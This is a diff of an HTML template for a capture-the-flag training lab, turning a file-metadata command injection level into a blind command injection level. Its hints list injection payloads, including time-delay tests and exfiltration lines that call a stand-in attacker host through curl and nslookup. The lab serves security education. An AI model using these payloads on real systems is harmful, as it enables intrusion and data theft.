@@ -1,119 +1,103 @@
-{% extends 'base.html' %}
+{%extends 'base.html' %}
 
-{% block title %}Level 3: Command Injection in File Upload Metadata - R00tGlyph{% endblock %}
+{%block title %}Level 3: Blind Command Injection - R00tGlyph{%endblock %}
 
-{% block content %}
-<div class="row">
-    <div class="col-md-8 offset-md-2">
-        {% if cmdi_detected %}
-        <div class="alert alert-success">
-            <i class="bi bi-check-circle-fill me-2"></i>
-            <strong>Success!</strong> You've successfully exploited the command injection vulnerability in the file metadata processor! The challenge has been marked as completed.
-            {% if flag %}
-            <div class="mt-2">
-                <strong>Flag:</strong> <code>{{ flag }}</code>
-            </div>
-            {% endif %}
+{%block breadcrumb %}
+<span class="text-muted">Challenges</span> / <span class="text-muted">Command Injection</span> / <span>Level 3</span>
+{%endblock %}
+
+{%block content %}
+<div class="challenge-lab">
+    <div class="mission-panel">
+        <div class="mission-header">
+            <i class="bi bi-crosshair me-2"></i>Mission Control
         </div>
-        {% endif %}
+        <div class="mission-content">
+            <h5 class="mb-3">Blind Command Injection</h5>
+            <p class="text-secondary small mb-4">
+                Welcome to <strong>BackupService</strong>. Test for command injection vulnerabilities.
+            </p>
 
-        <div class="card">
-            <div class="card-header">
-                <h2 class="text-center">Level 3: Command Injection in File Upload Metadata</h2>
+            <div class="card mb-4 border-0 bg-light">
+                <div class="card-body p-3">
+                    <h6 class="card-title small text-uppercase text-muted mb-2">Objective</h6>
+                    <p class="mb-0 small">Exploit blind command injection</p>
+                </div>
             </div>
-            <div class="card-body">
-                <div class="alert alert-dark challenge-description" style="display: none;">
-                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Description</h4>
-                    <p>
-                        Welcome to <strong>MetaExtract</strong>, a fictional file metadata extraction tool! This challenge simulates a real-world scenario where a file upload metadata processor is vulnerable to command injection.
-                    </p>
-                    <p>
-                        The developers of MetaExtract have created a tool that extracts metadata from uploaded files. However, they've made a critical mistake in how they process the filename.
-                    </p>
-                    <p>
-                        <strong>Your Task:</strong> Exploit the command injection vulnerability in the file metadata processor to read the contents of the flag.txt file on the server.
-                    </p>
 
-                    <div class="alert alert-warning">
-                        <i class="bi bi-lightbulb-fill me-2"></i><strong>Hint:</strong> The application uses the filename in a command to extract metadata. What happens if you include command injection characters in the filename?
-                    </div>
-
-                    <div class="card mt-3">
-                        <div class="card-header">
-                            <h5><i class="bi bi-info-circle-fill me-2"></i>Additional Hints</h5>
-                        </div>
-                        <div class="card-body">
-                            <p>
-                                When exploiting command injection in file upload metadata processing, consider:
-                            </p>
-                            <ul>
-                                <li>How the filename might be used in a system command</li>
-                                <li>What command injection characters can be included in a filename</li>
-                                <li>How to craft a filename that will execute additional commands</li>
-                            </ul>
-                            <p>
-                                Try uploading a file with a specially crafted filename that includes command injection characters.
-                            </p>
+            <div class="hint-accordion accordion" id="hintsAccordion">
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#hint1">
+                            <i class="bi bi-lightbulb me-2"></i> Hint 1: Blind Injection
+                        </button>
+                    </h2>
+                    <div id="hint1" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
+                        <div class="accordion-body small text-secondary">
+                            No output visible. Use time delays: <code>; sleep 5</code> or out-of-band techniques.
                         </div>
                     </div>
                 </div>
-
-
-
-                <div class="card mb-4">
-                    <div class="card-header">
-                        <h4 class="mb-0"><i class="bi bi-file-earmark-binary me-2"></i>File Metadata Extractor</h4>
-                    </div>
-                    <div class="card-body">
-                        <form action="{{ url_for('cmdi_level3') }}" method="post" enctype="multipart/form-data">
-                            <div class="mb-3">
-                                <label for="file" class="form-label">Upload a file to extract its metadata</label>
-                                <input class="form-control" type="file" id="file" name="file">
-                                <div class="form-text">Supported file types: All file types</div>
-                            </div>
-                            <button type="submit" class="btn btn-primary">Extract Metadata</button>
-                        </form>
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#hint2">
+                            <i class="bi bi-code-slash me-2"></i> Hint 2: Time-based Detection
+                        </button>
+                    </h2>
+                    <div id="hint2" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
+                        <div class="accordion-body small text-secondary">
+                            Test: <code>file.txt; sleep 10</code>. If response delays 10 seconds, you have command injection.
+                        </div>
                     </div>
                 </div>
-
-                {% if metadata_result %}
-                <div class="card mb-4">
-                    <div class="card-header">
-                        <h5 class="mb-0"><i class="bi bi-terminal-fill me-2"></i>Metadata Extraction Results</h5>
+                <div class="accordion-item">
+                    <h2 class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#hint3">
+                            <i class="bi bi-shield-check me-2"></i> Hint 3: Solution
+                        </button>
+                    </h2>
+                    <div id="hint3" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
+                        <div class="accordion-body small text-secondary">
+                            Exfiltrate data: <code>; curl http://attacker.com/$(whoami)</code> or use DNS: <code>; nslookup $(whoami).attacker.com</code>
+                        </div>
                     </div>
-                    <div class="card-body">
-                        <pre class="bg-dark text-light p-3 rounded"><code>{{ metadata_result }}</code></pre>
-                    </div>
-                </div>
-                {% endif %}
-
-                <div class="card mb-3">
-                    <div class="card-header">
-                        <h5><i class="bi bi-lightbulb-fill me-2"></i>Background Information</h5>
-                    </div>
-                    <div class="card-body">
-                        <p>
-                            File upload functionality is a common feature in web applications, but it can introduce security vulnerabilities if not implemented correctly. One such vulnerability is command injection in file metadata processing.
-                        </p>
-                        <p>
-                            In 2023, security researchers found that:
-                        </p>
-                        <ul>
-                            <li>Over 30% of file upload vulnerabilities involve metadata processing</li>
-                            <li>Filenames are often passed directly to system commands without proper sanitization</li>
-                            <li>Metadata extraction tools like ExifTool and ImageMagick have been exploited in the wild</li>
-                        </ul>
-                    </div>
-                </div>
-
-
-
-                <div class="mt-4">
-                    <a href="{{ url_for('solutions', level='cmdi3') }}" class="btn btn-outline-secondary"><i class="bi bi-lightbulb-fill me-2"></i>View Solution</a>
-                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-primary float-end"><i class="bi bi-arrow-left me-2"></i>Back to Challenges</a>
                 </div>
             </div>
+
+            {%if cmdi_detected %}
+            <div class="flag-success mt-4">
+                <div class="d-flex align-items-center gap-2 mb-2">
+                    <i class="bi bi-check-circle-fill text-success"></i>
+                    <strong>Mission Accomplished!</strong>
+                </div>
+                <p class="small text-secondary mb-2">You've successfully exploited the vulnerability.</p>
+                {%if flag %}
+                <span class="flag-value">{{ flag }}</span>
+                {%endif %}
+            </div>
+            {%endif %}
+        </div>
+    </div>
+
+    <div class="work-panel">
+        <div class="browser-bar">
+            <div class="d-flex gap-2 text-secondary">
+                <i class="bi bi-arrow-left"></i>
+                <i class="bi bi-arrow-right"></i>
+                <i class="bi bi-arrow-clockwise"></i>
+            </div>
+            <div class="url-bar">
+                <i class="bi bi-lock-fill text-success me-2 small"></i>
+                <span>backup.local/create</span>
+            </div>
+        </div>
+
+        <div class="app-frame p-4">
+            <p class="text-muted">Challenge interface for Command Injection Level 3</p>
         </div>
     </div>
 </div>
-{% endblock %}
+{%endblock %}
